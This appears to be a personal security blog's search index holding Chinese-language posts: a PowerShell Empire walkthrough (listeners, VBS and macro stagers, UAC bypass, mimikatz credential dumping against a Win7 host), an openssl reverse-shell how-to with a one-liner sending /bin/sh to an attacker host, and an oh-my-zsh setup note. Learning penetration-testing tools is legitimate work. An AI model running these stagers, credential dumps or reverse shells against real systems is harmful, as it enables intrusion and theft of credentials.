<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>empire</title>
      <link href="/2019/04/12/empire/"/>
      <url>/2019/04/12/empire/</url>
      
        <content type="html"><![CDATA[<p><strong>Empire详解</strong></p><hr><p><strong>一、empire简介</strong></p><blockquote><p>Empire是一个PowerShell后期漏洞利用代理工具同时也是一款很强大的后渗透测神器，它建立在密码学、安全通信和灵活的架构之上。Empire实现了无需powershell.exe就可运行PowerShell代理的功能。快速部署后期漏洞利用模块，从键盘记录器到Mimikatz，并且能够适应通信躲避网络检测，所有的这些功能都封装在一个以实用性为重点的框架中。</p></blockquote><blockquote><p>关于内网渗透，我们平时基本第一时间想到Metasploit，集信息收集，预渗透，渗透，后渗透，木马，社会工程学于一体的平台，但是Empire就是针对内网的渗透，针对powershell，在内网渗透能用到的powershell脚本，全部集成在Empire框架中，其更是域渗透神器。</p></blockquote><hr><p>二、empire的安装</p><pre><code>git clone https://github.com/EmpireProject/Empire.gitcd Empire/cd setup/sudo ./install.shcd Empire/cd setup/./reset.sh</code></pre><hr><p>三、empire简单命令</p><pre><code>cd Empire/./empire</code></pre><p><img src="/2019/04/12/empire/help.png" alt="help.png"></p><pre><code>(Empire) &gt; helpCommands=================agents          跳转到 &quot;代理&quot; 菜单。creds           显示数据库中的凭据。exit            退出帝国help            显示帮助菜单。interact        与特定代理交互。list            列出活动代理或侦听器。listeners       侦听器与活跃的侦听器交互。load            从非标准文件夹加载empire模块。plugin          加载一个插件文件来扩展empire。plugins         所有可用和活动的插件。preobfuscate    预融合 PowerShell 模块源文件reload          重新加载一个 (或全部) empire模块。report          生成CSV和日志文件报告: session.csv, credentis.csv, master.logreset           重置全局选项 (例如 IP 白名单)。resource        从文件中读取并执行empire命令的列表。searchmodule    模块搜索empire模块名称描述。set             设置全局选项 (例如 IP 白名单)。show            显示全局选项 (例如 IP 白名单)。usemodule       使用empire模块。usestager       使用者使用empire的毒刺。</code></pre><pre><code>(Empire) &gt; help(Empire) &gt; listeners(Empire: listeners) &gt; info(Empire: listeners) &gt; set Name test(Empire: listeners) &gt; execute(Empire: listeners) &gt; usestager launcher test(Empire: agents) &gt; interact USSZC2P1XCTBKYGH(Empire: USSZC2P1XCTBKYGH) &gt; shell dir(Empire: USSZC2P1XCTBKYGH) &gt; shell ipconfig</code></pre><blockquote><p>代理监听IP地址更改：<br>通过kali下的SQLiteBrowser打开empire下data目录下的数据库empire.db修改监听IP</p></blockquote><hr><p>四、生成反弹shell代理</p><ol><li>powershell反弹shell代理</li></ol><pre><code>(Empire: listeners) &gt; usestager(Empire: listeners) &gt; usestager launcher test(Empire: stager/launcher) &gt; execute执行生成后的命令反弹shell成功</code></pre><pre><code>(Empire) &gt; listeners(Empire: listeners) &gt; uselistener(Empire: listeners) &gt; uselistener http(Empire: listeners/http) &gt; info(Empire: listeners/http) &gt; set Name WIN7(Empire: listeners/http) &gt; set Host http://192.168.1.25:8889(Empire: listeners/http) &gt; set Port 8889(Empire: listeners/http) &gt; execute(Empire: listeners/http) &gt; listeners(Empire: listeners) &gt; launcher powershell WIN7执行生成的powershell脚本，empire端显示监听成功</code></pre><p><img src="/2019/04/12/empire/1.png" alt="listeners"></p><ol start="2"><li>python反弹shell代理</li></ol><pre><code>(Empire: listeners) &gt; launcher python WIN7执行生成的python脚本，empire端显示监听成功</code></pre><ol start="3"><li>vbs反弹shell代理</li></ol><pre><code>(Empire: listeners) &gt; usestager windows/launcher_vbs WIN7(Empire: stager/windows/launcher_vbs) &gt; info(Empire: stager/windows/launcher_vbs) &gt; execute执行在tmp目录下生成的launcher.vbs，empire端显示监听成功</code></pre><ol start="4"><li>钓鱼宏代理</li></ol><pre><code>(Empire: listeners) &gt; usestager windows/macro WIN7(Empire: stager/windows/macro) &gt; info(Empire: stager/windows/macro) &gt; execute将在tmp目录下生成的macro文件中的代码，复制到创建execl的宏代码中。</code></pre><p>五、empire攻击win7过程</p><ol><li>进入listeners</li></ol><p><img src="/2019/04/12/empire/1.png" alt="listeners"></p><ol start="2"><li><p>使用并配置http listeners<br><img src="/2019/04/12/empire/2.png" alt="listeners"></p></li><li><p>使用攻击木马<br><img src="/2019/04/12/empire/3.png" alt="listeners"></p></li><li><p>使用并生成vbs类型的攻击木马<br><img src="/2019/04/12/empire/4.png" alt="listeners"></p></li></ol><p><img src="/2019/04/12/empire/5.png" alt="listeners"></p><ol start="5"><li><p>在tmp目录下生成launcher.vbs木马<br><img src="/2019/04/12/empire/6.png" alt="listeners"></p></li><li><p>执行木马后，empire端成功返回监听代理<br><img src="/2019/04/12/empire/7.png" alt="listeners"></p></li><li><p>修改代理名字<br><img src="/2019/04/12/empire/8.png" alt="listeners"></p></li><li><p>进入代理并使用bypassuac提权，提权成功生成一个在Username处前有<code>*</code>号的新的代理。<br><img src="/2019/04/12/empire/9.png" alt="listeners"></p></li><li><p>修改提权之后的代理名称，进入代理，使用mimikatz抓取机器密码，creds查看明文和密文密码<br><img src="/2019/04/12/empire/10.png" alt="listeners"></p></li></ol><p><img src="/2019/04/12/empire/11.png" alt="listeners"></p><p><img src="/2019/04/12/empire/12.png" alt="listeners"></p><p><img src="/2019/04/12/empire/13.png" alt="listeners"></p><ol start="10"><li><p>sysinfo查看系统信息<br><img src="/2019/04/12/empire/14.png" alt="listeners"></p></li><li><p>upload上传文件、download下载文件、dir查看目录<br><img src="/2019/04/12/empire/15.png" alt="listeners"></p></li></ol><p><img src="/2019/04/12/empire/16.png" alt="listeners"></p><p>六、命令详解</p><ol><li>listeners</li></ol><pre><code>(Empire) &gt; listeners(Empire: listeners) &gt; helpListener Commands=================agents          跳转到代理菜单。back            返回到主菜单。creds           从数据库返回凭据。delete          从数据库中删除删除侦听器disable         禁用 (停止) 一个或所有侦听器。听者不会自动从帝国开始edit            编辑更改侦听器选项, 在重新启动侦听器之前不会生效enable          启用并启动一个或所有列表。exit            退出empire。help            显示帮助菜单。info            显示给定活动侦听器的信息。kill            杀死一个或所有活跃的侦听器。launcher        为侦听器生成初始启动器。list            列出所有活动侦听器 (或代理)。listeners       跳转到侦听器菜单。main            返回主菜单。resource        从文件中读取并执行帝国命令的列表。uselistener     使用empire听众模块。usestager       使用empire的stager木马。</code></pre><p><img src="/2019/04/12/empire/listeners.png" alt="listeners"></p><ol start="2"><li>usestarger<br><code>`</code><br>(Empire) &gt;usestager stager/windows/launcher_vbs win71pre<br>(Empire: stager/windows/launcher_vbs) &gt; help</li></ol><p>agents              跳转到代理菜单。<br>back                 返回返回菜单。<br>creds               从数据库返回凭据。<br>execute           执行生成器执行给定的empire支架。<br>exit                 退出empire。<br>generate           执行给定的empire支架。<br>help                 显示帮助菜单。<br>info                 显示统计器选项。<br>interact           与特定代理交互。<br>list                 列出所有活动代理 (或侦听器)。<br>listeners         跳转到侦听器菜单。<br>main                 返回主菜单。<br>options           选项显示统计器选项。<br>resource           从文件中读取并执行empire命令的列表。<br>set                 设置一个稳定器选项。<br>unset               取消设置的统计器选项。</p><pre><code>3. interact</code></pre><p>(Empire) &gt;interact win71pre<br>(Empire: win71pre) &gt; help</p><h1 id="Agent-Commands"><a href="#Agent-Commands" class="headerlink" title="Agent Commands"></a>Agent Commands</h1><p>agents                 跳转到代理菜单。<br>back                   返回菜单。<br>bypassuac           运行bypassuac, 绕过uac，为侦听器生成一个新的高完整性代理。例如: 生成<listener><br>clear                 清除代理任务。<br>creds                 从数据库返回凭据。<br>download             任务代理下载文件。<br>exit                   退出任务代理退出。<br>help                   显示特定命令的帮助菜单或语法。<br>info                   显示有关此代理的信息<br>injectshellcode 将侦听器shellcode注入远程进程。例如: 注射代码&lt;meter_listener&gt; <pid><br>jobs                   返回作业或终止正在运行的作业。<br>kill                   终止任务代理以终止特定的进程名称或 ID。<br>killdate            获取或设置代理的杀人日期 (01.5。<br>list                   列出所有活动代理 (或侦听器)。<br>listeners           跳转到侦听器菜单。<br>lostlimit            代理更改丢失的代理检测的限制<br>main                  返回主菜单。<br>mimikatz             在客户端上运行调用调用。<br>psinject             将启动器注入远程进程。例如, 项目<listener> <pid rocess_name><br>pth                   通过Mimikatz执行CredID的PTH。<br>rename                 重命名重命名代理。<br>resource             从文件中读取并执行empire命令的列表。<br>revtoself           使用凭据令牌来恢复令牌特权。<br>sc                       采用屏幕截图, 默认值为 PNG。给出比率意味着使用 JPEG。例如, sc [1-100]<br>scriptcmd           在当前导入的 PowerShell 脚本中执行一个函数。<br>scriptimport      脚本端口导入 PowerShell 脚本并将其保存在代理的内存中。<br>searchmodule       搜索模块搜索empire模块名称描述。<br>shell                 要使用 shell 命令的代理。<br>shinject             将注入非 meterpreter 侦听器shellcode插入远程进程。例如: shinject <listener> <pid><br>sleep                 休眠任务代理到 “睡眠间隔 [抖动]”<br>spawn                 生成一个新的empire代理为给定的听众名称。例如: 生成<listener><br>steal_token       使用凭据令牌模拟给定进程 ID 的令牌。<br>sysinfo             任务代理以获取系统信息。<br>updatecomms       动态更新代理通信到另一个侦听器<br>updateprofile     更新代理连接配置文件。<br>upload                上载文件。<br>usemodule           使用empire powershell模块。<br>workinghours       获取或设置代理的工作时间 (9:00-17:00).<br><code>`</code><br><img src="/2019/04/12/empire/interact.png" alt="interact"></listener></pid></listener></pid></listener></pid></listener></p><ol start="4"><li>agents</li></ol><p><img src="/2019/04/12/empire/agents.png" alt="agents"></p><ol start="5"><li>creds</li></ol><p><img src="/2019/04/12/empire/creds.png" alt="creds"></p><ol start="6"><li><p>list<br><img src="/2019/04/12/empire/list.png" alt="list"></p></li><li><p>launcher<br><img src="/2019/04/12/empire/launcher.png" alt="launcher"></p></li><li><p>load<br><img src="/2019/04/12/empire/load.png" alt="load"></p></li></ol><ol start="9"><li>plugin<br><img src="/2019/04/12/empire/plugin.png" alt="plugin"></li></ol><ol start="10"><li><p>plugins<br><img src="/2019/04/12/empire/plugins.png" alt="plugins"></p></li><li><p>reload<br><img src="/2019/04/12/empire/reload.png" alt="reload"></p></li><li><p>report<br><img src="/2019/04/12/empire/report.png" alt="report"></p></li><li><p>reset<br><img src="/2019/04/12/empire/reset.png" alt="reset"></p></li><li><p>searchmodule</p></li></ol><p><img src="/2019/04/12/empire/searchmodule.png" alt="searchmodule"></p><ol start="18"><li>set</li></ol><p><img src="/2019/04/12/empire/set.png" alt="set"></p><ol start="20"><li>show</li></ol><p><img src="/2019/04/12/empire/show.png" alt="show"></p><ol start="22"><li>usemodule</li></ol><p><img src="/2019/04/12/empire/usemodule.png" alt="usemodule"></p><ol start="24"><li>usestager</li></ol><p><img src="/2019/04/12/empire/usestager.png" alt="usestager"></p><p>七、Refer</p><blockquote><p><a href="http://www.powershellempire.com/" target="_blank" rel="noopener">PowerShell Empire | Building an Empire with PowerShell</a><br><a href="http://www.powershellempire.com/?page_id=110" target="_blank" rel="noopener">Quick Start | PowerShell Empire</a><br><a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">GitHub - EmpireProject/Empire: Empire is a PowerShell and Python post-exploitation agent.</a><br><a href="https://xz.aliyun.com/t/67" target="_blank" rel="noopener">后渗透测试神器Empire的详解 - 先知社区</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>openssl-shell</title>
      <link href="/2019/04/09/openssl-shell/"/>
      <url>/2019/04/09/openssl-shell/</url>
      
        <content type="html"><![CDATA[<p>利用openssl反弹shell</p><hr><blockquote><p><strong>1. 在远程攻击主机上生成秘钥文件</strong></p></blockquote><pre><code>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</code></pre><p><img src="/2019/04/09/openssl-shell/openssl-1.png" alt="openssl-1.png"></p><hr><blockquote><p><strong>2. 在远程攻击主机上启动监视器</strong></p></blockquote><pre><code>openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;PORT&gt;</code></pre><p><img src="/2019/04/09/openssl-shell/openssl-2.png" alt="openssl-2.png"></p><hr><blockquote><p><strong>3. 在目标机上反弹shell</strong></p></blockquote><pre><code>mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;ATTACKER-IP&gt;:&lt;PORT&gt; &gt; /tmp/s; rm /tmp/s</code></pre><p><img src="/2019/04/09/openssl-shell/openssl-3.png" alt="openssl-3.png"></p><hr><blockquote><p><strong>4. refer</strong></p></blockquote><p><a href="https://medium.com/@int0x33/day-43-reverse-shell-with-openssl-1ee2574aa998" target="_blank" rel="noopener">https://medium.com/@int0x33/day-43-reverse-shell-with-openssl-1ee2574aa998</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>oh-my-zsh</title>
      <link href="/2019/04/08/oh-my-zsh/"/>
      <url>/2019/04/08/oh-my-zsh/</url>
      
        <content type="html"><![CDATA[<p>Install Oh-my-zsh In Linux</p><hr><blockquote><p><strong>1. Install</strong></p></blockquote><pre><code class="shell">apt install -y gitapt install -y zshsh -c &quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;sh -c &quot;$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)&quot;</code></pre><hr><blockquote><p><strong>2. My Theme</strong></p></blockquote><ul><li>1</li></ul><pre><code class="shell">cd .oh-my-zsh/custom/themes/vim robbyrussell-ascii.zsh-theme</code></pre><ul><li>2</li></ul><pre><code class="shell">local ret_status=&quot;%(?:%{$fg[green]%}&gt;:%{$fg[red]%}&gt;%s)&quot;PROMPT=&#39;${ret_status} %{$fg[cyan]%}%~ %{$reset_color%} $(git_prompt_info) # &#39;ZSH_THEME_GIT_PROMPT_PREFIX=&quot;%{$fg[blue]%}git:(%{$fg[red]%}&quot;ZSH_THEME_GIT_PROMPT_SUFFIX=&quot;%{$reset_color%} &quot;ZSH_THEME_GIT_PROMPT_DIRTY=&quot;%{$fg[blue]%}) %{$fg[yellow]%}x%{$reset_color%}&quot;ZSH_THEME_GIT_PROMPT_CLEAN=&quot;%{$fg[blue]%})&quot;</code></pre><ul><li>3</li></ul><pre><code class="shell">vim .zshrcZSH_THEME=&quot;robbyrussell-ascii&quot;</code></pre><hr><blockquote><p><strong>3. 效果如图</strong></p></blockquote><p><img src="/2019/04/08/oh-my-zsh/oh-my-zsh.png" alt="oh-my-zsh.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
